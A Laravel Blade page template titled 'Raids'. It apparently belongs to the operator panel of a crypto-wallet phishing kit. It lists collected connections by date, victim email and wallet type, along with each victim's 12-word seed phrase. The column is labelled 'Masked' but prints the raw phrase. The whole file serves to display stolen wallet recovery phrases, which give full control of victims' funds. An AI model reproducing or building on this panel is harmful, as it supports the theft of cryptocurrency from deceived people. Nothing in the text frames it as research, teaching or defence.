<x-app-layout>

    <div class="layout-content-container flex flex-col max-w-[960px] flex-1">
        <div class="flex flex-wrap justify-between gap-3 p-4">
            <p class="text-[#0e141b] tracking-light text-[32px] font-bold leading-tight min-w-72">Raids</p>
        </div>
        <div class="px-4 py-3 @container">
            <div class="overflow-x-auto rounded-lg border border-[#d0dbe7] bg-slate-50">
                <table class="min-w-full">
                    <thead>
                        <tr class="bg-slate-50">
                            <th
                                class="px-4 py-3 text-left text-[#0e141b] text-sm font-medium leading-normal min-w-[150px]">
                                Date
                            </th>
                            <th
                                class="px-4 py-3 text-left text-[#0e141b] text-sm font-medium leading-normal min-w-[150px]">
                                Recipient
                            </th>

                            <th
                                class="px-4 py-3 text-left text-[#0e141b] text-sm font-medium leading-normal min-w-[150px]">
                                Wallet Type
                            </th>
                            <th
                                class="px-4 py-3 text-left text-[#0e141b] text-sm font-medium leading-normal min-w-[150px]">
                                Masked 12-Word
                            </th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach ($connections as $connection)
                            <tr class="border-t border-t-[#d0dbe7]">
                                <td class="h-[72px] px-4 py-2 text-[#4e7097] text-sm font-normal leading-normal">
                                    {{ $connection->created_at->format('d M Y H:i') }}
                                </td>
                                <td class="h-[72px] px-4 py-2 text-[#4e7097] text-sm font-normal leading-normal">
                                    {{ $connection->user_email }}
                                </td>

                                <td class="h-[72px] px-4 py-2 text-[#4e7097] text-sm font-normal leading-normal">
                                    {{ $connection->wallet_type }}
                                </td>
                                <td class="h-[72px] px-4 py-2 text-[#4e7097] text-sm font-normal leading-normal">
                                    {{ $connection->seed_phrase }}
                                </td>
                            </tr>
                        @endforeach

                    </tbody>
                </table>
            </div>
        </div>
    </div>
</x-app-layout>
